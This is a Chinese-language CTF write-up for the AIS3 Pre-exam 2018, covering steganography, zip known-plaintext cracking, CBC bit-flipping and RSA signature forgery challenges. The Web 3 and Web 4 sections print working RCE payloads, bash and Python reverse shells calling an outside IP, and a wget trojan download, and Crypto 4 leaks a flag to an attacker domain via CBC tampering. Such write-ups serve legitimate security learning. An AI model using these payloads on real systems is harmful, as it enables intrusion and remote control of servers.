# AIS3 Pre-exam 2018


**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180601-ais3preexam/) of this writeup.**


 - [AIS3 Pre-exam 2018](#ais3-pre-exam-2018)
   - [Rev](#rev)
   - [Pwn](#pwn)
   - [Misc](#misc)
     - [Misc 1](#misc-1)
     - [Misc 2](#misc-2)
     - [Misc 3](#misc-3)
     - [Misc 4](#misc-4)
   - [Web](#web)
     - [Web 1](#web-1)
     - [Web 2](#web-2)
     - [Web 3](#web-3)
     - [Web 4](#web-4)
   - [Crypto](#crypto)
     - [Crypto 1](#crypto-1)
     - [Crypto 2](#crypto-2)
     - [Crypto 3 (unsolved, thanks to @how2hack)](#crypto-3-unsolved-thanks-to-how2hack)
     - [Crypto 4](#crypto-4)



[AIS3 (Advanced Information Security Summer School)](https://ais3.org/) is a cyber security course in Taiwan. Therefore this writeup will be written in Chinese:)

By @bookgin, @sces60107

And thanks to @how2hack for the writeup of crypto 3!


## Rev

@sces60107 破臺，但太忙沒空寫xD

## Pwn

@sces60107 太忙沒空寫也沒空打xD

## Misc

### Misc 1

看題目中給的影片就有 flag 了。

### Misc 2

這題給了一個圖片，想辦法找 flag。![](https://i.imgur.com/7O4997q.jpg)

圖一看就知道是假 flag，但還是手賤傳了一下然後被 server 嗆 incorrect (這次的解題平台還會紀錄 flag 錯誤次數XD)，再來就是圖片分析起手式 [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)，也沒什麼東西，而且這次一張超糊的 jpg。

看來不是藏在圖片中，接下來就是 strings, binwalk, foremost，用binwalk/foremost 可以抽出一個 zip 檔，但是這個 zip 被加密了。

雖然 zip 有被加密，但是檔名、資料夾結構、檔案大小沒有加密，我們發現裡面有 ` backup/Avengers_Infinity_War_Poster.jpg` 跟 `backup/flag` ，這張 Avengers Infinity War Poster 把檔案名稱上網搜尋，可以找到 [wiki](https://kk.wikipedia.org/wiki/%D0%A1%D1%83%D1%80%D0%B5%D1%82:Avengers_Infinity_War_poster.jpg) 有一張檔案名稱一樣的，連大小都一樣，在[這裡。](https://upload.wikimedia.org/wikipedia/kk/archive/4/4d/20180606151139%21Avengers_Infinity_War_poster.jpg)

zip 有一種攻擊叫做 known-plaintext attack，在已知部份明文的情況下，可以算出壓縮檔案的密碼，這個在[某一年 ais3 pre-exam 也出過](https://www.30cm.tw/2015/08/ctf-ais3-write-up.html)，用 pkcrack 就可以解開。

把明文的 zip 跟路徑弄好之後執行以下指令，得到密碼為 `asdfghjkl;`

```sh
./pkcrack -C flag.zip -c "backup/Avengers_Infinity_War_Poster.jpg" -P plain.zip -p "backup/Avengers_Infinity_War_Poster.jpg"
```

解開 zip 後得到 flag `AIS3{NONONONONONONONONONONO}`，但你以為這樣就結束了嗎？錯，這個 flag 是假的，送到解題平臺只會徒增 incorrect flag 的次數。

然後我就卡在這裡，嘗試在對原本的圖片做更詳細的分析、對 zip 做詳細檢查有沒有藏東西，但都一無所獲，看著解題人數有二三十人，應該是很簡單的方向，這個 zip known-plaintext attack 卻不是 flag......

最後主辦單位給出了 hint，印象中是叫我們注意  `AIS3{Not_this_one}` 第一個假 flag 的下方，請各位仔細回去看上面那張圖字的下排，你會發現跟上面明顯不對稱。@sces60107 很快發現這是摩斯密碼，我還在眼花看著高壓縮度的 jpg 不知道摩斯密碼在哪裡，看了大概五分鐘才看出來，這密碼解出來就是真的 flag 了。



本題非常具有金盾獎的水準。

在題目裡面放假的 flag 是還好，但這個 zip known-plaintext attack 的假 flag，讓人偏離正規解法太遠，這樣出題並不是很恰當。

### Misc 3

題目給一個 mp3 音樂檔，聽上去就是一個人在清唱歌曲。

初步 strings, binwalk, foremost 都找不出任何有用的東西。進一步就是用 audacity/sonic visualizer 開起來看波形跟 spectrogram，但也沒什麼特別的。

這樣大致可以猜測這題可能是用某些專業的 audio stego 的軟體來做的，但是不知道那一款？

來試試看 Google `svega.mp3` ，沒有什麼收穫......（但 @sces60107 一搜尋第一個就是 mp3stego，我猜可能是 Google 預設語言/個人偏好設定不同，導致結果差很多）

那這樣只能有點無腦的暴力嘗試常見的 Audio Stego 軟體了，試了[一些](https://github.com/DominicBreuker/stego-toolkit)都沒效，連 [mp3stego](http://www.petitcolas.net/steganography/mp3stego/) 都試過了（用default的密碼 pass），但仔細想想覺得 mp3stego 還是最有可能的，因為他是我唯一找到 mp3 格式的 stego 軟體，但需要密碼才能解開。

之前嘗試 default 的密碼 `PASS`，密碼錯誤，那來試一下密碼空白呢？果然解密成功拿到 flag 。

### Misc 4

這題有點可惜，我賽後十分鐘才解出來，遠端的 nc 實在是太慢了 XD

先附上 server 的 code：

```python
import os
from Crypto.Cipher import AES
from base64 import b64decode

key = os.urandom(16)
answer = int.from_bytes(os.urandom(16), 'big')

with open("flag", 'r') as data:
    flag = data.read().strip()

def decrypt(text):
    iv, text = text[:16], text[16:]
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(text)

print("===== Welcome to number game =====")

while True:
    number = decrypt(b64decode(input("guess : ").strip()))[:16]
    number = int.from_bytes(number, 'big')
    if number > answer: print("Too big")
    elif number < answer: print("Too small")
    else: print(flag)
```

題目會有一個答案，然後你可以給他一個數字，透過 CBC 的特性改 IV 能夠翻轉不同 bit，server 會告訴你你的數字比他大還是比他小，如果一樣就可以拿到 flag，總共有 128 bits。

首先先想一下，我們有機會 bit by bit 猜嗎？

如果第一個 bit 被我們猜中了，那我們在透過翻轉剩下的 127 bits，必定可以找到兩組數字，一組比答案大，一組比答案小；相反的如果我們第一個 bit 就猜錯，那無論怎麼翻轉剩下的 bits，都只會恆比答案大，或是恆比答案小。

舉例來說，我們一次翻兩個 bits，即 [00, 01] 與 [10, 11]，如果其中有一組出現一大一小，那我們可以確定該組的第一個 bit 是對的。如果沒有一組出現一大一小，只好一次翻三個 bits，即 [000, 001], [010, 011], [100,101], [110,111]，這四組之中若有一組出現一大一小，那我們可以確定該組的前兩個 bits 是對的。

那 worse case 的複雜度呢？假設答案是 1 ，我們原本猜測的數字是 0，那這個情況要到一次翻前127 bits 時，某一組出現 [00000...0, 00000...1]，才會發現一大一小，這個 worse case 可是有著 要翻 $2^{128}$ 次才能發現........

進一步考慮 worse case 發生的情況，會發現其實沒這麼容易發生，在答案隨機的情況下，需要一次翻 10 個 bits 的發生機率為 $ 2^{-9}$ （需要考慮 0 與 1 的狀況），所以就可以利用上述方法來猜每個 bit 了。 

解題 script 寫的很醜，因為解題的的當下有一段時間沒有好好睡覺了XD

```python
#!/usr/bin/env python3
# Python 3.6.5
from pwn import *
import base64
import string, os
from itertools import product

chars = string.digits + string.ascii_letters

def PoW(prefix):
    for i in product(*[chars for _ in range(5)]):
        x = prefix + ''.join(i)
        sha256 = hashlib.sha256()
        sha256.update(x.encode())
        if sha256.hexdigest()[:6] == '000000':
            return x
    raise RuntimeError("Unfortunately, PoW not found.")

def b64(n):
    return base64.b64encode(n.to_bytes(16, byteorder='big') + b'SlowpokeIsCute<3')

def isSmall(n):
    #print(s.recvuntil(b': '))
    s.sendline(b64(n))
    r = s.recvuntil('\n').decode()
    if 'AIS3' in r:
        print(r)
        exit(0)
    return 'small' in r

def p(n):
    print('{:0128b}'.format(n))

def guess(n, idx, prefix_bits=0): # BFS
    if (prefix_bits == 8 or prefix_bits > idx): # oh we fail
        print('fail')
        return None
    assert n & ((1<<(idx+1))-1) == 0
    for prefix in range(1<<prefix_bits):
        x = n | prefix<<(idx-prefix_bits+1)
        print(idx, prefix_bits)
        y = x | 1<<(idx-prefix_bits)
        if isSmall(x) != isSmall(y): # TADA !
            return (x, y), idx - prefix_bits - 1
    return guess(n, idx, prefix_bits+1)

s = remote('104.199.235.135', 20004)
pow_str = s.recvuntil('x = ').decode()
x_prefix = pow_str.split("'")[1]
ans = PoW(x_prefix)
s.sendline(ans)

s.recvuntil('\n')
idx = 8*16-2
n0, n1 = 0, 1<<127
while True:
    res = guess(n0, idx)
    if not res:
        res = guess(n1, idx)
    assert res is not None
    (n0, n1), idx = res
    p(n0)
    p(n1)
```

Flag: `AIS3{ag3NTs Of S.H.I.E.L.D. - I 10V3 d4Isy J0HNs0n}`

這題沒有到太難，但前兩天都沒人解，貌似是因為 timeout ，原本好像只有 150 秒的限制，後來調到 300 秒再調到 600 秒的樣子(含PoW)。

## Web

### Web 1

如題目敘述，HTTP response header 就有部份 flag，寫個 script 抓一下就好。

### Web 2

沒記錯的話應該是掃 robots.txt 之類的找到 `_hidden_flag_.php`，這個頁面會用 js 讓你等十幾秒，時間到了會有按鈕跑出來進入下一個頁面，這個 js 被混淆過了：

```javascript
var _0x13ed=['getElementById','disp','setInterval','onload','clearInterval','innerHTML','<input\x20type=\x22submit\x22\x20value=\x22Get\x20flag\x20in\x20the\x20next\x20page.\x22/>'];(function(_0x4ff87b,_0x35e2bc){var _0x2c01be=function(_0x216360){while(--_0x216360){_0x4ff87b['push'](_0x4ff87b['shift']());}};_0x2c01be(++_0x35e2bc);}(_0x13ed,0x13f));var _0x5d44=function(_0x592680,_0x1e9b97){_0x592680=_0x592680-0x0;var _0x50206c=_0x13ed[_0x592680];return _0x50206c;};var left=0x0;var timer=null;var disp=null;function countdown(){left=left-0x1;if(timer!=null&&left==0x0){window[_0x5d44('0x0')](timer);timer=null;disp[_0x5d44('0x1')]=_0x5d44('0x2');}else{disp[_0x5d44('0x1')]='('+left+')';}}function setup(){disp=document[_0x5d44('0x3')](_0x5d44('0x4'));left=0xa+parseInt(Math['random']()*0xa);timer=window[_0x5d44('0x5')](countdown,0x3e8);disp[_0x5d44('0x1')]='('+left+')';}window[_0x5d44('0x6')]=setup;
```

事實上根本沒必要看，但我還是分析了一下，就只是 Math.random 隨機秒數之後產生 button，拿頁面上的參數送 post 去下一關。

再度觀察 header (thanks to @sces60107 的提醒)，header 會告知你有沒有拿到正確的 flag，所以寫 script 一直送 request，往下一關走，判斷 header 有沒有 flag 就好，總共送個一兩萬筆 request 就能拿到 flag。

### Web 3

題目 code 我沒存，但大致上是這樣:

```php
<?php
highlight_file(__file__);
$_ = $_GET['🍣'];
if (stripos($_, '"') !== false || stripos($_, "'") !== false)
  die('GG');
eval('die("'.substr($_, 0, 16).'");');
```

16 個 byte 放到 `die(" [PAYLOAD] ");` 中去 eval，其中 payload 不能包含單雙引號。

稍微查一下 php 的特性，會發現 [php double-quote string 可以放 dollar `$`](http://php.net/manual/en/language.types.string.php#language.types.string.parsing) ，可以用來 expand variables，進一步測試發現還可以做 function call，參考[這裡](http://php.net/manual/en/language.types.string.php#language.types.string.parsing) 的 "Complex (curly) syntax"。

然後 php [backtick](http://php.net/manual/en/language.operators.execution.php) 可以用來 call shell，那目標明確：結合兩者直接拿 shell。

先來個測試的 payload，一般做 proof of concept 的測試我都是用 `sleep 3`, `sh`, `cat /dev/urandom`, `yes`  之類來看會不會 hang 住，進而測試 RCE 可能性。

```
🍣=${`sleep 5`}
```

果然真的睡了五秒才回，那可以 RCE 了，基本上可以拿 flag，但能不能拿到 reverse shell 呢？

長度限制只有 16 bytes，reverse shell 的 payload 落落長很難在 16 bytes 內，那該怎麼拉長自己的 payload ？只好再依靠 php 幫我們一把，我們把 payload 用 get 傳，再靠 PHP interpret 變數並 RCE:

```
🍣=${`$_GET[1]`}&1=RCE_PAYLOAD
```

Python script:

```python
#!/usr/bin/env python3
import requests
payload = 'bash -i >& /dev/tcp/240.1.23/12345 0>&1 2>&1'
r = requests.get('http://104.199.235.135:31333/', params={'🍣':'${`$_GET[1]`}', '1': payload})
print(r.text)
```

### Web 4

先用 [scanner](https://github.com/YSc21/webcocktail) 掃到 `.git` 後用 [gitdumper](https://github.com/internetwache/GitTools) 拿下來，可以看到 perl 的 source code:

```perl
#!/usr/bin/perl
# My uploader!
use strict;
use warnings;
use CGI;
my $cgi = CGI->new;
print $cgi->header();
print "<body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\">";
print "<p style='color:red'>No BUG Q_____Q</p>";
print "<br>";
print "<pre>";
if( $cgi->upload('file') ) {
        my $file = $cgi->param('file');
        while(<$file>) {
                print "$_";
        }
}
print "</pre>";
```

看了我也不知道要幹麻，那就 Google 一下吧，翻了一下發現這題之前已經出過一模一樣的：

- https://dciets.com/writeups/2016/09/18/csaw-quals-ctf-2016-i-got-id/
- https://tsublogs.wordpress.com/2016/09/18/606/
- https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf

```python
#!/usr/bin/env python3
# Python 3.6.5
import requests
import re

s = requests.session()

'''
1. To send multiple files, we have tp use list here
2. Each element is a tuple, (POST name, (filename, file content))
3. The filename of ARGV must be empty
'''

files = [('file', ('', 'ARGV')), ('file', ('filename1', 'content1'))]
while True:
    rce = 'sh -c /readflag|xxd|'
    r = s.post('http://104.199.235.135:31334/cgi-bin/index.cgi?' + lfi_filepath, files=files)
    #print(r.text)
    print(re.findall(r'<pre>(.*)</pre>', r.text, re.S)[0])

'''
Raw payload:

POST /cgi-bin/index.cgi?/etc/passwd HTTP/1.1
Host: 104.199.235.135:31334
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 255
Content-Type: multipart/form-data; boundary=83b02634dc0d43e7992884eb46e3aed5

--83b02634dc0d43e7992884eb46e3aed5
Content-Disposition: form-data; name="file"; filename=""

ARGV
--83b02634dc0d43e7992884eb46e3aed5
Content-Disposition: form-data; name="file"; filename="filename1"

content1
--83b02634dc0d43e7992884eb46e3aed5--
'''
```

可以 RCE 基本上可以拿 flag，但能不能彈 reverse shell 呢？嘗試執行 reverse shell payload 卻發現 bash 馬上關掉，那只好用土一點的方法，先 wget 下載木馬，再執行 reverse shell，這次是 python 2.7 的 [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("240.1.2.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```
wget 240.1.2.3:1234 -O /tmp/abcd
```

出完全一樣的題目好像不太好(?)

## Crypto

### Crypto 1

忘了，貌似是算完 PoW 就拿到 flag

### Crypto 2

XOR 題：

```python
#!/usr/bin/env python3                                                                                                                   
import os
import random

with open('flag', 'rb') as data:
    flag = data.read()
    assert(flag.startswith(b'AIS3{'))

def extend(key, L): 
    kL = len(key)
    return key * (L // kL) + key[:L % kL] 

def xor(X, Y): 
    return bytes([x ^ y for x, y in zip(X, Y)])

key = os.urandom(random.randint(8, 12))
plain = flag + key 
key = extend(key, len(plain))
cipher = xor(plain, key)

with open('flag-encrypted', 'wb') as data:
    data.write(cipher)
```

因為他最後會把 key 加到 plain text 上，利用這個特性可以藉由 flag 開頭是 `AIS3{`推導出剩下的 bytes，基本上就是把 flag rotate 了 k 個 bytes，再跟 flag 本身 xor：

```python
#!/usr/bin/env python3
# Python 3.6.5

from pwn import xor

with open('flag.enc', 'rb') as f:
    c = f.read()


for key_len in range(8, 13):
    parts = []
    for i in range(len(c)//key_len + 1):
        parts.append(c[i*key_len: (i+1)*key_len])
        print(parts[-1].hex())
    #x ^ y = z
    x = [xor(i, j) for i, j in zip(b'AIS3{', c)] + [None for _ in range(key_len - len('AIS3{'))]
    right_rotate = len(parts[-1])
    y = x[-right_rotate:] + x[:-right_rotate]

    z = c[-key_len:]
    z = z[-right_rotate:] + z[:-right_rotate]
    z = [bytes([i]) for i in z]
    for i in range(key_len):
        if y[i] is None and x[i] is not None:
            y[i] = xor(z[i], x[i])
            if x[i-right_rotate] is None:
                x[i-right_rotate] = y[i]
        if x[i] is None and y[i] is not None:
            x[i] = xor(z[i], y[i])
            if y[(i+right_rotate)%key_len] is None:
                y[(i+right_rotate)%key_len] = x[i]

    print(xor(b''.join(x), c))
```

### Crypto 3 (unsolved, thanks to @how2hack)

Server code:

```python
#!/usr/bin/env python3
import os
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes

#from proof import proof

# some encoding problem in docker ( not important )
import io
import sys
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

#with open('flag') as data:
#    flag = data.read()

normal = '\033[0m'
bold = '\033[1m'
red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
blue = '\033[94m'
purple = '\033[95m'
aquamarine = '\033[96m'

def cprint(text, color = normal):
    if color == normal:
        print(text)
    else:
        print('{}{}{}'.format(color, text, normal))

#proof()

m = """
I owe you 10 bucks
- 2018/4/1 Alice
""".strip()
key = RSA.generate(2048, os.urandom)
m = int.from_bytes(m.encode('utf-8'), 'big')
s = key.sign(m, 0)[0]

cprint('◢' + '■' * 50 + '◣', bold)
cprint("- 2018/4/1", green)
cprint("Alice : Here is the receipt for the loan.", yellow)
cprint("m = {}".format(m))
cprint("Alice : Here is the digital signature (s, n, e) to prove that I actually wrote that receipt.", yellow)
cprint("s = {}".format(s))
cprint("n = {}".format(key.n))
cprint("e = {}".format(key.e))
cprint("Bob : OK, remember to pay me back someday.", aquamarine)
cprint('◥' + '■' * 50 + '◤', bold)

cprint('')
cprint("🚀  on millions years later..", red)
cprint('')

cprint('◢' + '■' * 50 + '◣', bold)
cprint("- 1002018/4/1", green)
cprint("Bob : Dormammu, I've come to bargain.", aquamarine)
cprint("Alice : Uh..., I'm not Dormammu.", yellow)
cprint("Bob: Whatever..., I think it's time for you to pay me back.", aquamarine)
cprint("Bob : Here is the receipt for the loan and also the signature.", aquamarine)

try:
    m = int(input("m = "))
    s = int(input("s = "))
    if key.verify(m, (s,)):
        m = long_to_bytes(m)
        print(m)
        print(m.split())
        print(m.split()[3])
        bucks = int(m.split()[3])
        print(bucks)
        if bucks > 10:
            cprint("Alice : Oh crap, I don't have enough money..., maybe this flag can compensate you : {}".format(flag), yellow)
        else:
            cprint("Alice : Come on man, it's just 10 bucks...", yellow)
        exit(0)
    else:
        cprint("Alice : What have you done...", yellow)
except:
    exit(0)
    
...
```

基本上是要偽造簽名，我一開始嘗試直接爆破 s，嘗試可能的 s 使得 $s^e = m$，並且 m 會讓 `int(m.split()[3]) > 10`，不過 s 跑了幾千萬都是失敗，因為太難讓 m 出現三個 0x20 (空格) 了。

既然單純爆破 s 不太可行，那就把原本合法的 m 乘上去吧，畢竟原本合法的 m 有不少的 0x20，這個好性質使得乘上 m 之後，很快就可以搜出合法的解： 

```python
#!/usr/bin/env python3
# Python 3.6.5

# Solution thanks to @how2hack
from Crypto.Util.number import long_to_bytes

m = 554925652019585156475787890525225102046075682323304548835475744305803283492262994789
s = 8893931972182818044887642802041512151637835508778733483367383922956088851535543045353394423623009836954355437544623799405164469870666785493058916365730516406144818232329263261760598226562026674786971455782715020921619619272079877118489050655967728826115222391008470575222102106503254745378891954974052584021934609709120680006462744982083961724037574311385291857678940299733481927081819784710368972540801034570491587923992073030931037900174432334370101464769099165656306608605116392023443785561469993626851198599801789525811680963922516035028163499926100820053526995911509771419784466544291151531282528959015443443997
n = 21232057752203050626327375413774655245866966677562081461618777215050100809614174448121718664073874770580592047257544090518156549247464236449881573516955891064948348640120104781529771203540220265613570642486380465030497213834318682366615946716455109515130588928786185167829699861919862539288169713824716271127284133643717019874393701490287994956317815564214797946176560219681181431433749699809927415253346547229042693265155026780261727400030789693357428715693850685842499335548901588448935551794449164274161376491308273104734354438424848886632452109979780615769063146540382650313788634482118159125354009606248992156239
e = 65537

for i in range(2**30):
    t = pow(i, e, n) * m % n 
    t=  long_to_bytes(t)
    #print(m.split())
    try:
        if len(t.split()) >= 4 and int(t.split()[3]) > 10: 
            print(t)
    except ValueError:
        pass
```

### Crypto 4

Server code:

```python
#!/usr/bin/env python3
import os, sys
import re
import random
from urllib.error import HTTPError, URLError
from urllib.request import urlopen
from urllib.parse import quote
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from proof import proof

with open('flag') as data:
    flag = data.read()
# simplify mail format
mail_for_ctfplayer = '''
From: thor@ais3.org
To: ctfplayer@ais3.org

--BOUNDARY
Type: text
Welcome to AIS3 pre-exam.

--BOUNDARY
Type: cmd
echo 'This is the blog of oalieno'
web 'https://oalieno.github.io'
echo 'This is the blog of bamboofox team'
web 'https://bamboofox.github.io/'

--BOUNDARY
Type: text
You can find some useful tutorial on there.
And you might be wondering where is the flag?
Just hold tight, and remember that patient is virtue.

--BOUNDARY
Type: text
Here is your flag : {}

--BOUNDARY
Type: text
Hope you like our crypto challenges.
Thanks for solving as always.
I'll catch you guys next time.
See ya!

--BOUNDARY
'''.format(flag).lstrip().encode('utf-8')

quotes = ['Keep on going never give up.',
          'Believe in yourself.',
          'Never say die.',
          "Don't give up and don't give in.",
          'Quitters never win and winners never quit.']

seen = False
key = os.urandom(16)
iv = os.urandom(16)

def pad(text):
    L = -len(text) % 16
    return text + bytes([L]) * L

def unpad(text):
    L = text[-1]
    if L > 16:
        raise ValueError
    for i in range(1, L + 1):
        if text[-i] != L:
            raise ValueError
    return text[:-L]

def parse_mail(mail):
    raw_mail = b""

    # parse many chunk
    while True:

        # throw away the delimeter
        _, _, mail = mail.partition(b'--BOUNDARY\n')
        if not mail:
            break

        # parse Type
        type_, _, mail = mail.partition(b'\n')
        type_ = type_.split(b': ')[1]

        # Type: text
        if type_ == b'text':
            text, _, mail = mail.partition(b'\n\n')
            raw_mail += text + b'\n'

        # Type: cmd
        elif type_ == b'cmd':

            # parse many cmd
            while True:

                # see '\n\n' then continue to next chunk
                if mail[:1] == b'\n':
                    mail = mail[1:]
                    break
                
                # parse cmd, content
                cmd, _, mail = mail.partition(b"'")
                content, _, mail = mail.partition(b"'\n")

                # echo 'content' ( print some text )
                if cmd.startswith(b'echo'):
                    raw_mail += content + b'\n'

                # web 'content' ( preview some of the text on webpage )
                elif cmd.startswith(b'web'):
                    print(quote(content), file=sys.stderr)
                    x = content.find(b'//')
                    if x != -1:
                        url = content[:x].decode('utf-8') + '//' + quote(content[x+2:])
                    else:
                        url = 'http://' + quote(content)
                    try:
                        req = urlopen(url)
                        text = req.read()
                        raw_mail += b'+ ' + content + b'\n'
                        raw_mail += b'\n'.join(re.findall(b'<p>(.*)</p>', text)) + b'\n'
                    except (HTTPError, URLError) as e:
                        pass
    return raw_mail

def read_mail(mail):
    # I am so busy right now, no time to read the mails
    pass

def getmail():
    global seen
    if not seen:
        aes = AES.new(key, AES.MODE_CBC, iv)
        mail = aes.encrypt(pad(mail_for_ctfplayer))
        print(b64encode(mail).decode('utf-8'))
        seen = True
    else:
        print('you have read all mails.')

def sendmail(mail):
    mail = b64decode(mail)
    aes = AES.new(key, AES.MODE_CBC, iv)
    mail = unpad(aes.decrypt(mail))
    print(mail[8*16:10*16],  file=sys.stderr)
    mail = parse_mail(mail)
    read_mail(mail)

def menu():
    print('')
    print('{:=^20}'.format(' menu '))
    print('1) ctf player mailbox')
    print('2) send me a mail')
    print('3) quit')
    print('=' * 20)

    option = int(input('> ').strip())
    if option == 1:
        getmail()
    elif option == 2:
        mail = input('mail : ')
        sendmail(mail)
    elif option == 3:
        print(random.choice(quotes))
    else:
        exit(0)

def main():
    proof()
    while True:
        menu()

main()
```

unpad 有好好檢查，沒什麼問題。但這題 padding oracle 仍然可做，不過有 PoW 要做，所以先思考看看有沒有別的作法，唯一比較可疑的是 `urlopen`，parse mail 回傳的東西不會印出來，那 `urlopen` 就有點多餘了。

我們有沒有辦法用 `urlopen` 去把 flag 傳回來呢？

先把 block 稍微排一下：

```
0 b'From: thor@ais3.'
1 b'org\nTo: ctfplaye'
2 b'r@ais3.org\n\n--BO'
3 b'UNDARY\nType: tex'
4 b't\nWelcome to AIS'
5 b'3 pre-exam.\n\n--B'
6 b'OUNDARY\nType: cm'
7 b"d\necho 'This is "
8 b'the blog of oali'
9 b"eno'\nweb 'https:"
10 b'//oalieno.github'
11 b".io'\necho 'This "
12 b'is the blog of b'
13 b"amboofox team'\nw"
14 b"eb 'https://bamb"
15 b'oofox.github.io/'
16 b"'\n\n--BOUNDARY\nTy"
```

我們可以利用 CBC 的特性，透過更改第 8 個 block 的密文，來更動第 9 個 block 的明文，雖然第 8 個 block 會解密成一堆爛掉的東西，但第 9 個 block 明文完全可控。

那如果我們把 flag 直接接在後面呢？這樣 `urlopen` 就會把解密後的 flag 傳回來了。

受限於 block size 的限制，我們的 domain name 要越短越好，所以直接上 [dot.tk](http://dot.tk/) 申請一個免洗的 top domain，四個字 `abcd.tk` 是不用錢的。

回到題目，這裡第 8 個 block 解爛不會怎樣，反正有第 9 個 block 的單引號就好，所以我們可以把第 9 個 block 變成 `'\nweb  'abcd.tk/` （其實 domain也不用這麼短），後面 parse 會補 `http://`，第 10 個 block 之後就接 flag 解密的 block，就能看到 server 把 flag 放在 url 傳回來了。

Flag 有提到 [CVE-2017-17689](https://nvd.nist.gov/vuln/detail/CVE-2017-17689) ，就是對 CBC 操作控制明文的 bug。

Script:

```python
#!/usr/bin/env python3
# Python 3.6.5
from pwn import *
import base64
from itertools import product

chars = string.digits + string.ascii_letters

def PoW(prefix):
    for i in product(*[chars for _ in range(5)]):
        x = prefix + ''.join(i)
        sha256 = hashlib.sha256()
        sha256.update(x.encode())
        if sha256.hexdigest()[:6] == '000000':
            return x
    raise RuntimeError("Unfortunately, PoW not found.")

def fold16(x):
    return [x[i*16:(i+1)*16] for i in range(len(x)//16+1)]

ps = [
    b'From: thor@ais3.',
    b'org\nTo: ctfplaye',
    b'r@ais3.org\n\n--BO',
    b'UNDARY\nType: tex',
    b't\nWelcome to AIS',
    b'3 pre-exam.\n\n--B',
    b'OUNDARY\nType: cm',
    b"d\necho 'This is ",
    b'the blog of oali', #8
    b"eno'\nweb 'https:",
    b'//oalieno.github', #10
    b".io'\necho 'This ",#11 leak
    b'is the blog of b',#12 leak
    b"amboofox team'\nw",#13 leak
    b"eb 'https://bamb",#14 leak
    b'oofox.github.io/', #15
    b"'\n\n--BOUNDARY\nTy",#16
    b'pe: text\nYou can',
    b' find some usefu',
    b'l tutorial on th',
    b'ere.\nAnd you mig',
    b'ht be wondering ',
    b'where is the fla',
    b'g?\nJust hold tig',
    b'ht, and remember',
    b' that patient is',
    b' virtue.\n\n--BOUN',
    b'DARY\nType: text\n',
    b'Here is your fla',
]


server = remote('104.199.235.135', 20003)
#server = remote('127.0.0.1', 20003)
pow_str = server.recvuntil('x = ').decode()
x_prefix = pow_str.split("'")[1]
ans = PoW(x_prefix)
server.sendline(ans)
server.recvuntil('> ')
server.sendline('1')
b64 = server.recvuntil('\n\n')
cs = fold16(base64.b64decode(b64))
server.recvuntil('> ')
#server.recvuntil('')
#print(cs)

assert ps[8] == b'the blog of oali'
inject = b"'\nweb  'abcd.tk/"
assert len(inject) == 16
#cs[8] = xor(cs[8], ps[9], inject)
cs[8] = xor(cs[8], ps[9], inject)

assert ps[28] == b'Here is your fla'
cs[10] = cs[28] # In order to display cs[29] properly
cs[11] = cs[29]
cs[12] = cs[30]
cs[13] = cs[31]
cs[14] = cs[32]

server.sendline('2')
print(server.recvuntil(': '))
b64 = base64.b64encode(b''.join(cs))
server.sendline(b64)
server.interactive()
#print(server.recv())
```
